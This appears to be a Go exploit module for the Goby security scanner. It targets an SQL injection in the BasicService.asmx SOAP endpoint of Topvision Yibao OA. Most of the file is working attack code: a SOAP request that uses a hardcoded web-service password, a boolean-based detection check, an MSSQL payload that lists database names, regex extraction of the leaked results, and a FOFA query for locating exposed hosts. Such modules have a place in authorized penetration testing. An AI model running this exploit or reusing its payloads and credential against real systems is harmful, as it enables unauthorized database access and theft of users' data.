package exploits

import (
	"errors"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Topvision-Yibao-OA /WebService/BasicService.asmx SQL Injection Vulnerability",
    "Description": "<p>Topvision-Yibao-OA, a mobile office software, has an SQL injection vulnerability in its  /WebService/BasicService.asmx  interface. This allows unauthenticated attackers to potentially gain access to the database.</p>",
    "Product": "Topvision-Yibao-OA",
    "Homepage": "http://www.its365.net/products.aspx/",
    "DisclosureDate": "2024-08-05",
    "PostTime": "2024-08-05",
    "Author": "maweixuan@baimaohui.net",
    "FofaQuery": "body=\"$.cookie(\\\\\\\\\\\"topvision_oaName\" || title=\"欢迎登录易宝OA系统\"&&body=\"顶讯\"",
    "GobyQuery": "body=\"$.cookie(\\\\\\\\\\\"topvision_oaName\" || title=\"欢迎登录易宝OA系统\"&&body=\"顶讯\"",
    "Level": "2",
    "Impact": "<p>This vulnerability could permit attackers to steal or alter sensitive information in the database, such as usernames, passwords, and other critical data, leading to broader security issues.</p>",
    "Recommendation": "<p>To mitigate this vulnerability, users are advised to update their YiBao OA systems to the latest version, which should address the known SQL injection issues.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "(SELECT CHAR(113)+CHAR(106)+CHAR(106)+CHAR(98)+CHAR(113)+(SELECT TOP 1 SUBSTRING((ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32))),1,1024) FROM master..sysdatabases WHERE ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysdatabases ORDER BY name) ORDER BY name)+CHAR(113)+CHAR(107)+CHAR(112)+CHAR(118)+CHAR(113))",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2024"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "易宝OA /WebService/BasicService.asmx SQL 注入漏洞",
            "Product": "顶讯科技-易宝OA系统",
            "Description": "<p>易宝OA是一款手机办公软件，其&nbsp;/WebService/BasicService.asmx&nbsp;接口存在SQL注入漏洞。这意味着未经身份验证的攻击者可能通过该漏洞获取数据库的访问权限。<br></p>",
            "Recommendation": "<p>建议用户关注官方补丁发布信息，打上补丁或者升级到最新版本。</p>",
            "Impact": "<p>此漏洞可能允许攻击者窃取或篡改数据库中的敏感信息，如用户名、密码和其他重要数据，进而可能导致更广泛的安全问题。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Topvision-Yibao-OA /WebService/BasicService.asmx SQL Injection Vulnerability",
            "Product": "Topvision-Yibao-OA",
            "Description": "<p>Topvision-Yibao-OA, a&nbsp;mobile office software, has an&nbsp;SQL injection&nbsp;vulnerability in its &nbsp;/WebService/BasicService.asmx&nbsp;&nbsp;interface. This allows&nbsp;unauthenticated attackers to potentially gain access to the database.<br></p>",
            "Recommendation": "<p>To mitigate&nbsp;this vulnerability, users are advised to update their YiBao OA systems to the latest version, which should address the known SQL injection issues.<br></p>",
            "Impact": "<p>This&nbsp;vulnerability could permit attackers to steal or alter sensitive information in the database, such as usernames, passwords, and other critical data, leading to broader security issues.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9919"
}`

	sendPayload_gaXIte := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		// POST请求
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			postRequest.Header.Store("Content-Type", "text/xml;charset=UTF-8")
			postRequest.Header.Store("SOAPAction", "http://tempuri.org/ExecuteSqlForSingle")
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}

		// URL路径
		url := `/WebService/BasicService.asmx`
		// 拼接SQL注入语句
		body := `<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:ExecuteSqlForSingle>
         <tem:sql>` + sql + `</tem:sql>
         <tem:strParameters>sonoras imperio</tem:strParameters>
         <tem:webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</tem:webservicePassword>
      </tem:ExecuteSqlForSingle>
   </soapenv:Body>
</soapenv:Envelope>`
		resp, err := setPostRequest(hostInfo, url, body)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 200 {
			return nil, errors.New("not response 200")
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sql := `(SELECT CONCAT(CONCAT('qxppq',(CASE WHEN (3551=3551) THEN '1' ELSE '0' END)),'qqqvq'))`
			resp, err := sendPayload_gaXIte(hostInfo, sql)
			if err != nil {
				return false
			}
			if !strings.Contains(resp.Utf8Html, "qxppq1qqqvq") {
				return false
			}
			ss.VulURL = hostInfo.FixedHostInfo + `/WebService/BasicService.asmx`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])

			switch attackType {
			case "sql":
				resp, err := sendPayload_gaXIte(expResult.HostInfo, sql)
				if err != nil && strings.Contains(err.Error(), "not response 200") {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}

				// 正则匹配利用结果，匹配 qjjbq 和 qkpvq 之间的字符串
				re := regexp.MustCompile(`qjjbq(.*?)qkpvq`)
				match := re.FindStringSubmatch(resp.Utf8Html)
				if len(match) < 2 {
					expResult.Output = `漏洞利用失败: 未找到匹配的内容`
					expResult.Success = false
					return expResult
				}
				expResult.Success = true
				expResult.Output = `Extracted content: ` + match[1]
				return expResult

			case "sqlPoint":
				_, err := sendPayload_gaXIte(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `漏洞利用失败: ` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Success = true
				expResult.Output = `POST /WebService/BasicService.asmx HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15
Content-Type: text/xml;charset=UTF-8
SOAPAction: http://tempuri.org/ExecuteSqlForSingle

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:ExecuteSqlForSingle>
         <tem:sql>` + sql + `</tem:sql>
         <tem:strParameters>sonoras imperio</tem:strParameters>
         <tem:webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</tem:webservicePassword>
      </tem:ExecuteSqlForSingle>
   </soapenv:Body>
</soapenv:Envelope>`

				return expResult

			default:
				expResult.Output = `Unknown attack type: ` + attackType
				expResult.Success = false
				return expResult
			}
		},
	))
}
